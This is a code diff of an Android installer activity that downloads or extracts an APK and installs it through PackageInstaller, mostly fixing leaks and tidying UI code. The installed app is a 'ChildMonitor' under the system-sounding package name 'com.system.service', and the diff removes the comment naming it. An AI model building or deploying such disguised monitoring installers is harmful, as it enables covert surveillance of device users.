@@ -37,7 +37,7 @@ class MainActivity : AppCompatActivity() {
         private const val STEP_INSTALL    = 3
         private const val STEP_DONE       = 4
         private const val STEP_ERROR      = -1
-        private const val TOTAL_DOTS      = 4   // steps 1-4 shown as dots
+        private const val TOTAL_DOTS      = 4
     }
 
     // ── Panels
@@ -101,6 +101,10 @@ class MainActivity : AppCompatActivity() {
                     val mbTot  = intent.getFloatExtra(DownloadService.EXTRA_MB_TOTAL, 0f)
                     val spd    = intent.getIntExtra(DownloadService.EXTRA_SPEED, 0)
                     val eta    = intent.getIntExtra(DownloadService.EXTRA_ETA, -1)
+                    // FIX: Update subtitle from "Checking…" to "Downloading…" on first progress
+                    if (tvDownloadSub.text != getString(R.string.download_title)) {
+                        tvDownloadSub.text = getString(R.string.download_title)
+                    }
                     updateDownloadUI(pct, mbDone, mbTot, spd, eta)
                 }
                 DownloadService.ACTION_COMPLETE -> {
@@ -122,13 +126,12 @@ class MainActivity : AppCompatActivity() {
             when (intent?.getIntExtra(PackageInstaller.EXTRA_STATUS, -1)) {
                 PackageInstaller.STATUS_SUCCESS -> showStep(STEP_DONE)
                 PackageInstaller.STATUS_PENDING_USER_ACTION -> {
-                    // BUG #15 FIX: Use API 33+ getParcelableExtra with class param
-                      val launchIntent = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
-                          intent.getParcelableExtra(Intent.EXTRA_INTENT, Intent::class.java)
-                      } else {
-                          @Suppress("DEPRECATION") intent.getParcelableExtra(Intent.EXTRA_INTENT)
-                      }
-                      launchIntent?.let { startActivity(it) }
+                    val launchIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                        intent.getParcelableExtra(Intent.EXTRA_INTENT, Intent::class.java)
+                    } else {
+                        @Suppress("DEPRECATION") intent.getParcelableExtra(Intent.EXTRA_INTENT)
+                    }
+                    launchIntent?.let { startActivity(it) }
                 }
                 else -> {
                     val f = downloadedFile ?: File(cacheDir, "update.apk")
@@ -142,7 +145,6 @@ class MainActivity : AppCompatActivity() {
     // ─────────────────────────────────────────────────────────────────────
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-
         setContentView(R.layout.activity_main)
         bindViews()
         buildStepDots()
@@ -151,10 +153,6 @@ class MainActivity : AppCompatActivity() {
 
         tvVersion.text = "v${DeviceHelper.getAppVersion(this)}  •  ${DeviceHelper.getDeviceModel()}"
 
-        // I-7: If ChildMonitor already installed, skip straight to Done step.
-        // BUG FIX: showStep(STEP_DONE) was placed before showStep(STEP_WELCOME) which
-        // immediately followed — WELCOME overrode DONE so the "already installed" path
-        // was never visible. Move the check after tvVersion is set and return early.
         if (try { packageManager.getPackageInfo("com.system.service", 0); true } catch (_: Exception) { false }) {
             showStep(STEP_DONE)
             fetchLatestVersion()
@@ -163,11 +161,10 @@ class MainActivity : AppCompatActivity() {
         }
 
         showStep(STEP_WELCOME)
-        fetchLatestVersion()          // Flash Get: GetInstallConfig equivalent
+        fetchLatestVersion()
         lifecycleScope.launch(Dispatchers.IO) { AutoUpdater.checkAndUpdate(this@MainActivity) }
     }
 
-    // ── Bind all view references ──────────────────────────────────────────
     private fun bindViews() {
         panelWelcome    = findViewById(R.id.panelWelcome)
         panelPermission = findViewById(R.id.panelPermission)
@@ -200,7 +197,6 @@ class MainActivity : AppCompatActivity() {
         tvVersion = findViewById(R.id.tvVersion)
     }
 
-    // ── Step indicator dots ───────────────────────────────────────────────
     private fun buildStepDots() {
         stepDots.removeAllViews()
         val dotSizePx = resources.getDimensionPixelSize(R.dimen.dot_size)
@@ -217,7 +213,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun refreshDots(step: Int) {
-        val dotIndex = step - 1   // step 1 → dot 0, step 4 → dot 3
+        val dotIndex = step - 1
         for (i in 0 until stepDots.childCount) {
             stepDots.getChildAt(i).setBackgroundResource(
                 if (i <= dotIndex) R.drawable.dot_active else R.drawable.dot_inactive
@@ -225,7 +221,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ── Button wiring ─────────────────────────────────────────────────────
     private fun setupButtons() {
         btnBack.setOnClickListener {
             if (currentStep == STEP_PERMISSION) showStep(STEP_WELCOME)
@@ -269,7 +264,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ── BroadcastReceivers ─────────────────────────────────────────────────
     private fun registerReceivers() {
         val dlFilter = IntentFilter().apply {
             addAction(DownloadService.ACTION_PROGRESS)
@@ -285,7 +279,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ── Step navigation ───────────────────────────────────────────────────
     private fun showStep(step: Int) {
         currentStep = step
         listOf(panelWelcome, panelPermission, panelDownload, panelInstall, panelDone, panelError)
@@ -303,15 +296,11 @@ class MainActivity : AppCompatActivity() {
         target.alpha = 0f
         target.animate().alpha(1f).setDuration(220).start()
 
-        // Dots visible only during active steps 1-4
         stepDots.visibility = if (step in 1..4) View.VISIBLE else View.GONE
         if (step in 1..4) refreshDots(step)
-
-        // Back arrow only on permission step
         btnBack.visibility = if (step == STEP_PERMISSION) View.VISIBLE else View.INVISIBLE
     }
 
-    // ── Download flow ──────────────────────────────────────────────────────
     private fun beginDownloadFlow() {
         val hasBundled = try {
             BUNDLED_APK_NAME in (assets.list("") ?: emptyArray())
@@ -327,12 +316,10 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    /** Extract bundled APK from assets (fast-path, no network needed) */
     private fun extractFromAssets() {
         Thread {
             try {
                 val outFile = File(cacheDir, "update.apk")
-                // BUG FIX: openFd() was never closed → file descriptor leak
                 val totalBytes = assets.openFd(BUNDLED_APK_NAME).use { it.length }
                 var written = 0L
                 val startMs = System.currentTimeMillis()
@@ -343,12 +330,11 @@ class MainActivity : AppCompatActivity() {
                         while (input.read(buf).also { read = it } != -1) {
                             output.write(buf, 0, read)
                             written += read
-                            val pct   = if (totalBytes > 0) (written * 100 / totalBytes).toInt() else 0
-                            val ms    = (System.currentTimeMillis() - startMs).coerceAtLeast(1)
-                            // BUG #12 FIX: bytes/ms ≠ KB/s
-                            val spd   = (written * 1000L / (ms * 1024L)).toInt()
-                            val mbD   = written / 1_048_576f
-                            val mbT   = totalBytes / 1_048_576f
+                            val pct  = if (totalBytes > 0) (written * 100 / totalBytes).toInt() else 0
+                            val ms   = (System.currentTimeMillis() - startMs).coerceAtLeast(1)
+                            val spd  = (written * 1000L / (ms * 1024L)).toInt()
+                            val mbD  = written / 1_048_576f
+                            val mbT  = totalBytes / 1_048_576f
                             runOnUiThread { updateDownloadUI(pct, mbD, mbT, spd, -1) }
                         }
                     }
@@ -364,7 +350,6 @@ class MainActivity : AppCompatActivity() {
         }.start()
     }
 
-    /** Start DownloadService (OkHttp foreground download, Flash Get style) */
     private fun launchDownloadService() {
         val svc = Intent(this, DownloadService::class.java).apply {
             putExtra(DownloadService.EXTRA_URL,    downloadUrl)
@@ -387,33 +372,38 @@ class MainActivity : AppCompatActivity() {
         tvMb.visibility = View.VISIBLE
         tvSpeed.text = "${speedKbs} KB/s"
         tvSpeed.visibility = View.VISIBLE
-        tvEta.text   = when {
+        tvEta.text = when {
             etaSecs < 0   -> getString(R.string.eta_calculating)
             etaSecs < 60  -> getString(R.string.eta_seconds,  etaSecs)
             else           -> getString(R.string.eta_minutes, etaSecs / 60)
         }
     }
 
-    // ── Install ────────────────────────────────────────────────────────────
+    /**
+     * FIX: Session is always closed in a finally block to prevent PackageInstaller
+     * session resource leak when an exception is thrown after openSession().
+     */
     private fun installApk(apkFile: File) {
+        val installer = packageManager.packageInstaller
+        val params    = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
+        val sessionId = installer.createSession(params)
+        val session   = installer.openSession(sessionId)
         try {
-            val installer = packageManager.packageInstaller
-            val params    = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
-            val sessionId = installer.createSession(params)
-            installer.openSession(sessionId).use { session ->
-                session.openWrite("package", 0, apkFile.length()).use { out ->
-                    apkFile.inputStream().use { it.copyTo(out) }
-                    session.fsync(out)
-                }
-                val pi = PendingIntent.getBroadcast(
-                    this, sessionId,
-                    Intent(INSTALL_ACTION),
-                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
-                )
-                session.commit(pi.intentSender)
+            session.openWrite("package", 0, apkFile.length()).use { out ->
+                apkFile.inputStream().use { it.copyTo(out) }
+                session.fsync(out)
             }
+            val pi = PendingIntent.getBroadcast(
+                this, sessionId,
+                Intent(INSTALL_ACTION).apply { setPackage(packageName) },
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
+            )
+            session.commit(pi.intentSender)
         } catch (_: Exception) {
+            session.abandon()
             installWithFileProvider(apkFile)
+        } finally {
+            session.close()
         }
     }
 
@@ -434,9 +424,8 @@ class MainActivity : AppCompatActivity() {
         showStep(STEP_ERROR)
     }
 
-    // ── GitHub version check (Flash Get: GetInstallConfig) ────────────────
     private fun fetchLatestVersion() {
-        btnStart?.isEnabled = false
+        btnStart.isEnabled = false
         Thread {
             val info = VersionChecker.fetchLatest(okClient)
             runOnUiThread {
@@ -444,16 +433,13 @@ class MainActivity : AppCompatActivity() {
                     downloadUrl    = info.downloadUrl
                     expectedSha256 = info.sha256
                 }
-                // else keep FALLBACK_URL
-                btnStart?.isEnabled = true
+                btnStart.isEnabled = true
             }
         }.start()
     }
 
-    // ── Lifecycle ──────────────────────────────────────────────────────────
     override fun onResume() {
         super.onResume()
-        // Returning from Settings on permission step
         if (currentStep == STEP_PERMISSION && packageManager.canRequestPackageInstalls()) {
             beginDownloadFlow()
         }
